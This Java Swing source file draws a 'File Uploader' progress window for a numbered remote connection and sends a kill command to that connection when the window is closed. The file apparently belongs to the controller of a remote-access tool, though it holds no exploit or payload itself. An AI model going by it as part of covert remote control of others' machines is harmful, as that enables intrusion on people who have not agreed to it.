package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.util.ArrayList;

import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class Uploader {
	private  JFrame form ;
  
	private  String sock = "";
    private String Filename = "";
    private String full_progress = "";
	private String fname = "";
	private  JPanel Buttons;
	//Program Owner : Saher Blue Eagle
 
	public Uploader(String ip,String str1, String str2,String tr4) throws InterruptedException{
		this.sock = ip;
	    this.Filename = str1;
	    this.full_progress = str2;
		this.fname = tr4;
	}
	public void SetDownloader(String ip,String str1, String str2) throws InterruptedException{
		this.sock = ip;
	    this.Filename = str1;
	    this.full_progress = str2;
		 prog.setMaximum(100);
		 message.setText("... Working");
		 message.repaint();
	}
	public void SetDownloader_W(String ip,String str1) throws InterruptedException{
		this.sock = ip;
	    this.Filename = str1;
	   if (str1.contains("Error")){
		   filelocation.setText(str1);
		   filelocation.repaint();
		   message.setText("Cannot Upload File");
		   message.repaint();
		}else{
			 message.setText("... Working");
			 message.repaint();
		   filelocation.setText(str1);
		   filelocation.repaint();
	   }
	   form.repaint();
		 
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public String Get_sock(){
		return sock ;
	}
	public String Get_fname(){
		return fname ;
	}
  
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
     private JProgressBar prog;
     private  JLabel id;
     private  JLabel message;
     private  JLabel filelocation;
	 private int counprog=0;
	 private int current_chunk=0;
	 public void On_Finish(String Filepath,String b){
		 counprog = 0;
		 message.setText("");
		 message.repaint();
		 form.repaint();
		 filelocation.setText("");
		 filelocation.repaint();
		 prog.setValue(0);
		 id.setText("Progress : ");
		 id.repaint();
		 prog.setMaximum(0);
		 prog.repaint();
		 form.repaint();
		
		
		 
	 }
	public void set_chunk_counter(int max,int curr){
		double prec = (double) curr/max;
		prec = prec * 100;
		double rd = Math.round(prec);
	 form.setTitle( (int)rd +" % File Uploader For : " + sock);
	 form.setVisible(true);
	 form.repaint();
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		 current_chunk = curr  ;
		// counprog = (int) (x * 100.0 * prog.getMaximum());
	 
			 prog.setMaximum(100);
			 counprog = (int)rd ;
			 prog.setValue(counprog);
			 //System.out.println("\n"+("Progress : " + (curr/prog.getMaximum())*100 ) + " %" + "\n" + prog.getMaximum() + "\n" +current_chunk );
			 id.setText("Progress : " + rd + " %");
			 id.repaint();
			 prog.repaint();
			 form.repaint();
			 form.repaint();
			 Buttons.repaint();
			 if(prog.getValue()==prog.getMaximum()){
				 for (File_Manager_VB opnx : Master.Get_Open_FM_VB()){
						if(opnx.Get_sock().equals(sock)){
							opnx.re_enable();
					 
						}
					}
				 
			  }
				
			 
	 
//	counprog = x;
	}
 
	public  void Do_frame(){
		 form = new JFrame();
		 form.setName("File Uploader For : " + sock);
		 form.setTitle("File Uploader For : " + sock);
		 
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		
		 
		 
		
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 form.setFont(font); 
	 
			
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
		  
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"^.^","Drive / File / Folder", "Type / Ext.", "Size"}; 

		 
	        model.setColumnIdentifiers(columnNames);
	       
			
	        form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			    	    //on closing event
			    	
			    	
			    	 if (JOptionPane.showConfirmDialog(form, 
					            "Are you sure you want to close File Uploader From :  "+ sock +" window?", "Close Window?", 
					            JOptionPane.YES_NO_OPTION,
					            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			    		   Master.Remove_Form_Open_Downloaders_uns(sock,fname);
			    		   String Word = "";
			    			 String YY = "";
			    			 String xx = "|||";
			    			 YY = xx.charAt(0)+ "" +xx.charAt(1);
			    		   Master.Send_Data("kill_uns_up" + YY , sock,false);
				    	 	form.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
					        } else{
					        	form.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
					        }
			         
			          
			    }
			}); 
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.BOLD, 13);
		  
		//	 form.add(btnNext);
			// form.add(Dir);
		         
		
		//	 form.setBounds((widthx -300),(heightx -200), 300, 150);
		   form.setBounds((widthx -500)/2,( heightx -150)/2, 500, 150);
		  
		   		Buttons = new JPanel();
		        Buttons.setSize(form.getSize());
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		        
		        id = new JLabel("Progress : " );
		        id.setBounds(9,18, Buttons.getWidth(), 22);
		        id.setFont(fontx);
		        id.setForeground(Color.BLACK);
		        Buttons.add(id);
		        
		        prog = new JProgressBar();
		        prog.setBounds(5,19, Buttons.getWidth() - 30, 22);
		        prog.setFont(fontx);
		        prog.setMaximum(Integer.parseInt(full_progress));
		        Buttons.add(prog);
		        
		        
		        message = new JLabel("Status : Uploading Commanded" );
		        message.setBounds(5,35, Buttons.getWidth(), 25);
		        message.setFont(fontx);
		        message.setForeground(Color.WHITE);
		        Buttons.add(message);
		        
		             
		        filelocation = new JLabel(Filename);
		        filelocation.setBounds(5,50, Buttons.getWidth(), 50);
		        filelocation.setFont(fontx);
		        filelocation.setForeground(Color.WHITE);
		        Buttons.add(filelocation);
		        
		        
				 form.validate();
				 form.add(Buttons);
				 form.setResizable(false);
				  
				 form.setAlwaysOnTop(true);
				 form.setBackground(Color.DARK_GRAY);
				 
				 form.repaint();
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
		
	}
	
	
 
	
	
	
}

